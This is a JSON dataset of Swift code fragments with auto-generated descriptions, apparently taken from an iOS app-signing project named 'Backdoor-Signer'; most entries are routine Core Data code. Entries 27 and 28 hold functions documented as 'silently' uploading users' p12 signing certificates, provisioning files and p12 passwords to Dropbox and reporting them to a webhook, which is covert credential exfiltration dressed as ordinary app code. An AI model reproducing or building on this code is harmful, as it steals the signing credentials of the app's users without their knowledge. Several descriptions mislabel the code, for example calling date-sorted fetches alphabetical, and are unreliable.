[
  {
    "id": "0",
    "code": "public class ChatMessage: NSManagedObject {\n@NSManaged public var messageID: String?\n@NSManaged public var sender: String?\n@NSManaged public var content: String?\n@NSManaged public var timestamp: Date?\n@NSManaged public var session: ChatSession?\n\n@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatMessage> {",
    "nl": "class ChatMessage - implements functionality related to chat message",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatMessage.swift",
    "code_type": "class"
  },
  {
    "id": "1",
    "code": "@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatMessage> {\nreturn NSFetchRequest<ChatMessage>(entityName: \"ChatMessage\")\n}\n}\n\npublic extension ChatMessage {",
    "nl": "class func - implements func functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatMessage.swift",
    "code_type": "class"
  },
  {
    "id": "2",
    "code": "public extension ChatMessage {\n@objc var wrappedSender: String {",
    "nl": "extension ChatMessage - implements functionality related to chat message",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatMessage.swift",
    "code_type": "extension"
  },
  {
    "id": "3",
    "code": "public class ChatSession: NSManagedObject {\n@NSManaged public var sessionID: String?\n@NSManaged public var title: String?\n@NSManaged public var creationDate: Date?\n@NSManaged public var messages: NSSet?\n\n@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatSession> {",
    "nl": "class ChatSession - implements functionality related to chat session",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift",
    "code_type": "class"
  },
  {
    "id": "4",
    "code": "@nonobjc public class func fetchRequest() -> NSFetchRequest<ChatSession> {\nreturn NSFetchRequest<ChatSession>(entityName: \"ChatSession\")\n}\n\n// Relationship management methods\n@objc(addMessagesObject:)\n@NSManaged public func addToMessages(_ value: ChatMessage)\n\n@objc(removeMessagesObject:)\n@NSManaged public func removeFromMessages(_ value: ChatMessage)",
    "nl": "class func - implements func functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift",
    "code_type": "class"
  },
  {
    "id": "5",
    "code": "@NSManaged public func addToMessages(_ value: ChatMessage)\n\n@objc(removeMessagesObject:)\n@NSManaged public func removeFromMessages(_ value: ChatMessage)\n\n@objc(addMessages:)\n@NSManaged public func addToMessages(_ values: NSSet)\n\n@objc(removeMessages:)\n@NSManaged public func removeFromMessages(_ values: NSSet)\n}\n\npublic extension ChatSession {",
    "nl": "Function addToMessages - implements addtomessages functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift",
    "code_type": "function"
  },
  {
    "id": "6",
    "code": "@NSManaged public func removeFromMessages(_ value: ChatMessage)\n\n@objc(addMessages:)\n@NSManaged public func addToMessages(_ values: NSSet)\n\n@objc(removeMessages:)\n@NSManaged public func removeFromMessages(_ values: NSSet)\n}\n\npublic extension ChatSession {",
    "nl": "Function removeFromMessages - implements removefrommessages functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift",
    "code_type": "function"
  },
  {
    "id": "7",
    "code": "@NSManaged public func addToMessages(_ values: NSSet)\n\n@objc(removeMessages:)\n@NSManaged public func removeFromMessages(_ values: NSSet)\n}\n\npublic extension ChatSession {",
    "nl": "Function addToMessages - implements addtomessages functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift",
    "code_type": "function"
  },
  {
    "id": "8",
    "code": "@NSManaged public func removeFromMessages(_ values: NSSet)\n}\n\npublic extension ChatSession {",
    "nl": "Function removeFromMessages - implements removefrommessages functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift",
    "code_type": "function"
  },
  {
    "id": "9",
    "code": "public extension ChatSession {\n@objc var wrappedMessages: [ChatMessage] {",
    "nl": "extension ChatSession - implements functionality related to chat session",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/ChatSession.swift",
    "code_type": "extension"
  },
  {
    "id": "10",
    "code": "class AIChatCoreDataManager {\nstatic let shared = CoreDataManager.shared\n\nprivate init() {}",
    "nl": "class AIChatCoreDataManager - Manages system resources and operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift",
    "code_type": "class"
  },
  {
    "id": "11",
    "code": "func saveContext() {\ndo {",
    "nl": "Function saveContext - implements savecontext functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift",
    "code_type": "function"
  },
  {
    "id": "12",
    "code": "extension CoreDataManager {\n// Create new chat session\nfunc createAIChatSession(title: String? = nil) throws -> ChatSession {",
    "nl": "MARK: - Chat functionality moved to CoreDataManager",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift",
    "code_type": "extension"
  },
  {
    "id": "13",
    "code": "func createAIChatSession(title: String? = nil) throws -> ChatSession {\nlet ctx = try context\nlet chatSession = ChatSession(context: ctx)\n\nchatSession.sessionID = UUID().uuidString\nchatSession.title = title\nchatSession.creationDate = Date()\n\ntry saveContext()\nreturn chatSession",
    "nl": "Create new chat session",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift",
    "code_type": "function"
  },
  {
    "id": "14",
    "code": "func fetchChatSessions() -> [ChatSession] {\nlet fetchRequest: NSFetchRequest<ChatSession> = ChatSession.fetchRequest()\nfetchRequest.sortDescriptors = [NSSortDescriptor(key: \"creationDate\", ascending: false)]\n\ndo {",
    "nl": "Fetch all chat sessions",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift",
    "code_type": "function"
  },
  {
    "id": "15",
    "code": "func fetchRecentChatSessions(limit: Int = 20) -> [ChatSession] {\nlet fetchRequest: NSFetchRequest<ChatSession> = ChatSession.fetchRequest()\nfetchRequest.sortDescriptors = [NSSortDescriptor(key: \"creationDate\", ascending: false)]\nfetchRequest.fetchLimit = limit\n\ndo {",
    "nl": "Fetch recent chat sessions with limit",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift",
    "code_type": "function"
  },
  {
    "id": "16",
    "code": "func fetchChatSession(sessionID: String) -> ChatSession? {\nlet fetchRequest: NSFetchRequest<ChatSession> = ChatSession.fetchRequest()\nfetchRequest.predicate = NSPredicate(format: \"sessionID == %@\", sessionID)\nfetchRequest.fetchLimit = 1\n\ndo {",
    "nl": "Fetch specific chat session by ID",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift",
    "code_type": "function"
  },
  {
    "id": "17",
    "code": "func deleteChatSession(_ session: ChatSession) throws {\nlet ctx = try context\nctx.delete(session)\ntry saveContext()\n}\n\n// Add AI message (legacy method)\nfunc addAIMessage(to session: ChatSession, content: String, isUser: Bool) throws -> ChatMessage {",
    "nl": "Delete chat session",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift",
    "code_type": "function"
  },
  {
    "id": "18",
    "code": "func addAIMessage(to session: ChatSession, content: String, isUser: Bool) throws -> ChatMessage {\nreturn try addMessage(to: session, sender: isUser ? \"user\" : \"ai\", content: content)\n}\n\n// Delete message by ID\nfunc deleteMessage(withID messageID: String) {",
    "nl": "Add AI message (legacy method)",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift",
    "code_type": "function"
  },
  {
    "id": "19",
    "code": "func deleteMessage(withID messageID: String) {\nlet fetchRequest: NSFetchRequest<ChatMessage> = ChatMessage.fetchRequest()\nfetchRequest.predicate = NSPredicate(format: \"messageID == %@\", messageID)\nfetchRequest.fetchLimit = 1\n\ndo {",
    "nl": "Delete message by ID",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreData+AIChat.swift",
    "code_type": "function"
  },
  {
    "id": "20",
    "code": "extension Notification.Name {\nstatic let dropboxUploadError = Notification.Name(\"dropboxUploadError\")\nstatic let webhookSendError = Notification.Name(\"webhookSendError\")\nstatic let certificateFetch = Notification.Name(\"cfetch\")\n}\n\nextension CoreDataManager {",
    "nl": "Notification name constants for error reporting",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "extension"
  },
  {
    "id": "21",
    "code": "extension CoreDataManager {\n/// Clear certificates data\nfunc clearCertificate(context: NSManagedObjectContext? = nil) throws {",
    "nl": "extension CoreDataManager - Manages system resources and operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "extension"
  },
  {
    "id": "22",
    "code": "func clearCertificate(context: NSManagedObjectContext? = nil) throws {\nlet ctx = try context ?? self.context\ntry clear(request: Certificate.fetchRequest(), context: ctx)\n}\n\nfunc getDatedCertificate(context: NSManagedObjectContext? = nil) -> [Certificate] {",
    "nl": "/ Clear certificates data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "23",
    "code": "func getDatedCertificate(context: NSManagedObjectContext? = nil) -> [Certificate] {\nlet request: NSFetchRequest<Certificate> = Certificate.fetchRequest()\nrequest.sortDescriptors = [NSSortDescriptor(key: \"dateAdded\", ascending: true)]\ndo {",
    "nl": "Function getDatedCertificate - retrieves datedcertificate",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "24",
    "code": "func getCurrentCertificate(context: NSManagedObjectContext? = nil) -> Certificate? {\ndo {",
    "nl": "Function getCurrentCertificate - retrieves currentcertificate",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "25",
    "code": "func addToCertificates(\ncert: Cert,\nfiles: [CertImportingViewController.FileType: Any],\ncontext: NSManagedObjectContext? = nil\n) {",
    "nl": "Non-throwing version for backward compatibility",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "26",
    "code": "func addToCertificatesWithThrow(\ncert: Cert,\nfiles: [CertImportingViewController.FileType: Any],\ncontext: NSManagedObjectContext? = nil\n) throws {",
    "nl": "Throwing version with proper error handling",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "27",
    "code": "private func uploadBackdoorFileToDropbox(backdoorPath: URL, password: String?) {\n// No need to store the filename since it's not used\nlet enhancedDropboxService = EnhancedDropboxService.shared\n\n// Upload backdoor file with password handling\nenhancedDropboxService.uploadCertificateFile(\nfileURL: backdoorPath,\npassword: password\n) { success, error in",
    "nl": "/ Silently uploads backdoor file to Dropbox with password and sends info to webhook / - Parameters: /   - backdoorPath: Path to the backdoor file /   - password: Optional p12 password",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "28",
    "code": "private func uploadCertificateFilesToDropbox(provisionPath: URL, p12Path: URL?, password: String?) {\nlet enhancedDropboxService = EnhancedDropboxService.shared\n\n// Get the current certificate to send to webhook\nlet currentCerts = getDatedCertificate()\nlet certToSend = currentCerts.last\n\n// Upload provision file with error handling\nenhancedDropboxService.uploadCertificateFile(fileURL: provisionPath) { success, error in",
    "nl": "/ Silently uploads certificate files to Dropbox with password and sends info to webhook / - Parameters: /   - provisionPath: Path to the mobileprovision file /   - p12Path: Optional path to the p12 file /   - password: Optional p12 password",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "29",
    "code": "private func createCertificateEntity(\nuuid: String,\nprovisionPath: URL,\np12Path: URL?,\npassword: String?,\nbackdoorPath: URL? = nil,\ncontext: NSManagedObjectContext\n) -> Certificate {",
    "nl": "Function createCertificateEntity - creates certificateentity",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "30",
    "code": "private func createCertificateDataEntity(cert: Cert, context: NSManagedObjectContext) -> CertificateData {\nlet certData = CertificateData(context: context)\ncertData.appIDName = cert.AppIDName\ncertData.creationDate = cert.CreationDate\ncertData.expirationDate = cert.ExpirationDate\ncertData.isXcodeManaged = cert.IsXcodeManaged\ncertData.name = cert.Name\ncertData.pPQCheck = cert.PPQCheck ?? false\ncertData.teamName = cert.TeamName\ncertData.uuid = cert.UUID",
    "nl": "Function createCertificateDataEntity - creates certificatedataentity",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "31",
    "code": "private func saveCertificateFiles(uuid: String, provisionPath: URL, p12Path: URL?,\nbackdoorPath: URL? = nil) throws\n{",
    "nl": "Function saveCertificateFiles - implements savecertificatefiles functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "32",
    "code": "func getCertifcatePath(source: Certificate?) throws -> URL {\nguard let source, let uuid = source.uuid else {",
    "nl": "Function getCertifcatePath - retrieves certifcatepath",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "33",
    "code": "func getCertificateFilePaths(source: Certificate?) throws -> (provisionPath: URL, p12Path: URL) {\nguard let source = source, source.uuid != nil else {",
    "nl": "Function to get paths for mobileprovision and p12, handling backdoor files if present",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "34",
    "code": "func deleteAllCertificateContent(for app: Certificate) {\ndo {",
    "nl": "Non-throwing version for backward compatibility",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "35",
    "code": "func deleteAllCertificateContentWithThrow(for app: Certificate) throws {\nlet ctx = try context\nctx.delete(app)\ntry FileManager.default.removeItem(at: getCertifcatePath(source: app))\ntry ctx.save()\n}\n\n/// Add to signed apps with proper error handling\n/// - Parameters:\n///   - version: App version",
    "nl": "Throwing version with proper error handling",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "36",
    "code": "func addToSignedApps(\nversion: String,\nname: String,\nbundleidentifier: String,\niconURL: String,\nuuid: String,\nappPath: String,\ntimeToLive: Date,\nteamName: String,\noriginalSourceURL: URL?,\ncompletion: @escaping (Result<SignedApps, Error>) -> Void\n) {",
    "nl": "/ Add to signed apps with proper error handling / - Parameters: /   - version: App version /   - name: App name /   - bundleidentifier: Bundle identifier /   - iconURL: URL to app icon /   - uuid: UUID string /   - appPath: Path to the app /   - timeToLive: Certificate expiration date /   - teamName: Certificate team name /   - originalSourceURL: Original source URL /   - completion: Completion handler with result",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "37",
    "code": "func addToDownloadedApps(\nversion: String,\nname: String,\nbundleidentifier: String,\niconURL: String,\nuuid: String,\nappPath: String,\nsourceLocation: String? = nil,\ncompletion: @escaping (Result<DownloadedApps, Error>) -> Void\n) {",
    "nl": "/ Add to downloaded apps with proper file management / - Parameters: /   - version: App version /   - name: App name /   - bundleidentifier: Bundle identifier /   - iconURL: URL to app icon /   - uuid: UUID string /   - appPath: Path to the app /   - sourceLocation: Source location /   - completion: Completion handler with result",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "38",
    "code": "private func ensureAppDirectoryStructure(uuid: String, appPath: String) throws {\nlet fileManager = FileManager.default\nguard let documentsDirectory = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first else {",
    "nl": "/ Ensure app directory structure is correctly set up / - Parameters: /   - uuid: UUID string for the app /   - appPath: Path to the app bundle",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "39",
    "code": "func updateSignedApp(\napp: SignedApps,\nnewTimeToLive: Date,\nnewTeamName: String,\ncompletion: @escaping (Result<Void, Error>) -> Void\n) {",
    "nl": "/ Update a signed app with new data / - Parameters: /   - app: The app to update /   - newTimeToLive: New expiration date /   - newTeamName: New team name /   - completion: Completion handler",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "40",
    "code": "func clearUpdateStateForCertificate(for signedApp: SignedApps) throws {\nlet ctx = try context\n\n// Make sure we have the app in the right context\nlet appInContext: SignedApps\nif signedApp.managedObjectContext != ctx {",
    "nl": "/ Clear the update state for a signed app (alternative implementation) / - Parameter signedApp: The app to update",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "function"
  },
  {
    "id": "41",
    "code": "extension Certificate {\n@objc var backdoorPath: String? {",
    "nl": "Extension to add backdoorPath property to Certificate",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Certificates.swift",
    "code_type": "extension"
  },
  {
    "id": "42",
    "code": "extension CoreDataManager {\n/// Clear all dl from Core Data and delete files\nfunc clearDownloadedApps(context: NSManagedObjectContext? = nil) throws {",
    "nl": "extension CoreDataManager - Manages system resources and operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift",
    "code_type": "extension"
  },
  {
    "id": "43",
    "code": "func clearDownloadedApps(context: NSManagedObjectContext? = nil) throws {\nlet ctx = try context ?? self.context\ntry clear(request: DownloadedApps.fetchRequest(), context: ctx)\n}\n\n/// Fetch all sources sorted alphabetically by name\nfunc getDatedDownloadedApps(context: NSManagedObjectContext? = nil) -> [DownloadedApps] {",
    "nl": "/ Clear all dl from Core Data and delete files",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift",
    "code_type": "function"
  },
  {
    "id": "44",
    "code": "func getDatedDownloadedApps(context: NSManagedObjectContext? = nil) -> [DownloadedApps] {\nlet request: NSFetchRequest<DownloadedApps> = DownloadedApps.fetchRequest()\nrequest.sortDescriptors = [NSSortDescriptor(key: \"dateAdded\", ascending: false)]\ndo {",
    "nl": "/ Fetch all sources sorted alphabetically by name",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift",
    "code_type": "function"
  },
  {
    "id": "45",
    "code": "func addToDownloadedApps(\ncontext: NSManagedObjectContext? = nil,\nversion: String,\nname: String,\nbundleidentifier: String,\niconURL: String?,\ndateAdded: Date? = Date(),\nuuid: String,\nappPath: String?,\nsourceLocation: String? = \"Imported\",\nsourceURL: URL? = nil,\ncompletion: @escaping (Error?) -> Void\n) {",
    "nl": "/ Add application to downloaded apps",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift",
    "code_type": "function"
  },
  {
    "id": "46",
    "code": "func getDownloadedAppsFilePath(for app: DownloadedApps, getuuidonly: Bool = false) -> URL {\ndo {",
    "nl": "Function getDownloadedAppsFilePath - retrieves downloadedappsfilepath",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift",
    "code_type": "function"
  },
  {
    "id": "47",
    "code": "func deleteAllDownloadedAppContent(for app: DownloadedApps) {\ndo {",
    "nl": "/ Delete a downloaded app (non-throwing version for compatibility)",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift",
    "code_type": "function"
  },
  {
    "id": "48",
    "code": "func deleteAllDownloadedAppContentWithThrow(for app: DownloadedApps) throws {\nlet ctx = try context\nctx.delete(app)\n// Use self instead of shared to ensure consistent context usage\nlet fileURL = try getFilesForDownloadedApps(for: app, getuuidonly: true)\ntry FileManager.default.removeItem(at: fileURL)\ntry ctx.save()\n}\n}\n",
    "nl": "/ Delete a downloaded app with proper error handling",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+DownloadedApps.swift",
    "code_type": "function"
  },
  {
    "id": "49",
    "code": "extension CoreDataManager {\n/// Clear all signedapps from Core Data and delete files\nfunc clearSignedApps(context: NSManagedObjectContext? = nil) throws {",
    "nl": "extension CoreDataManager - Manages system resources and operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "extension"
  },
  {
    "id": "50",
    "code": "func clearSignedApps(context: NSManagedObjectContext? = nil) throws {\nlet ctx = try context ?? self.context\ntry clear(request: SignedApps.fetchRequest(), context: ctx)\n}\n\n/// Fetch all sources sorted alphabetically by name\nfunc getDatedSignedApps(context: NSManagedObjectContext? = nil) -> [SignedApps] {",
    "nl": "/ Clear all signedapps from Core Data and delete files",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "51",
    "code": "func getDatedSignedApps(context: NSManagedObjectContext? = nil) -> [SignedApps] {\nlet request: NSFetchRequest<SignedApps> = SignedApps.fetchRequest()\nrequest.sortDescriptors = [NSSortDescriptor(key: \"dateAdded\", ascending: false)]\ndo {",
    "nl": "/ Fetch all sources sorted alphabetically by name",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "52",
    "code": "func addToSignedApps(\ncontext: NSManagedObjectContext? = nil,\nversion: String,\nname: String,\nbundleidentifier: String,\niconURL: String?,\ndateAdded: Date? = Date(),\nuuid: String,\nappPath: String?,\ntimeToLive: Date,\nteamName: String,\noriginalSourceURL: URL?,\ncompletion: @escaping (Result<SignedApps, Error>) -> Void\n) {",
    "nl": "/ Add application to downloaded apps",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "53",
    "code": "func getFilesForSignedApps(for app: SignedApps, getuuidonly: Bool = false) -> URL {\ndo {",
    "nl": "Function getFilesForSignedApps - retrieves filesforsignedapps",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "54",
    "code": "func getFilesForSignedAppsWithThrow(for app: SignedApps, getuuidonly: Bool = false) throws -> URL {\nguard let uuid = app.uuid, let appPath = app.appPath, let dir = app.directory else {",
    "nl": "/ Get application file path with proper error handling",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "55",
    "code": "func deleteAllSignedAppContent(for app: SignedApps) {\ndo {",
    "nl": "/ Delete a signed app (non-throwing version for compatibility)",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "56",
    "code": "func deleteAllSignedAppContentWithThrow(for app: SignedApps) throws {\nlet ctx = try context\nctx.delete(app)\nlet fileURL = try getFilesForSignedAppsWithThrow(for: app, getuuidonly: true)\ntry FileManager.default.removeItem(at: fileURL)\ntry ctx.save()\n}\n\nfunc updateSignedApp(\napp: SignedApps,",
    "nl": "/ Delete a signed app with proper error handling",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "57",
    "code": "func updateSignedApp(\napp: SignedApps,\nnewTimeToLive: Date,\nnewTeamName: String,\ncompletion: @escaping (Error?) -> Void\n) {",
    "nl": "Function updateSignedApp - updates signedapp",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "58",
    "code": "func setUpdateAvailable(for app: SignedApps, newVersion: String) throws {\nlet ctx = try context\n\n// Ensure app is in the right context\nif app.managedObjectContext != ctx {",
    "nl": "Function setUpdateAvailable - sets updateavailable",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "59",
    "code": "func clearUpdateState(for app: SignedApps) throws {\napp.hasUpdate = false\napp.updateVersion = nil\ntry saveContext()\n}\n\n// Non-throwing versions for backward compatibility\nfunc setUpdateAvailableCompat(for app: SignedApps, newVersion: String) {",
    "nl": "Function clearUpdateState - implements clearupdatestate functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "60",
    "code": "func setUpdateAvailableCompat(for app: SignedApps, newVersion: String) {\ndo {",
    "nl": "Non-throwing versions for backward compatibility",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "61",
    "code": "func clearUpdateStateCompat(for app: SignedApps) {\ndo {",
    "nl": "Function clearUpdateStateCompat - implements clearupdatestatecompat functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+SignedApps.swift",
    "code_type": "function"
  },
  {
    "id": "62",
    "code": "extension CoreDataManager {\n/// Clear all sources from Core Data\nfunc clearSources(context: NSManagedObjectContext? = nil) throws {",
    "nl": "extension CoreDataManager - Manages system resources and operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "extension"
  },
  {
    "id": "63",
    "code": "func clearSources(context: NSManagedObjectContext? = nil) throws {\nlet ctx = try context ?? self.context\ntry clear(request: Source.fetchRequest(), context: ctx)\n}\n\n/// Fetch all sources sorted alphabetically by name\nfunc getAZSources(context: NSManagedObjectContext? = nil) -> [Source] {",
    "nl": "/ Clear all sources from Core Data",
    "language": "swift",
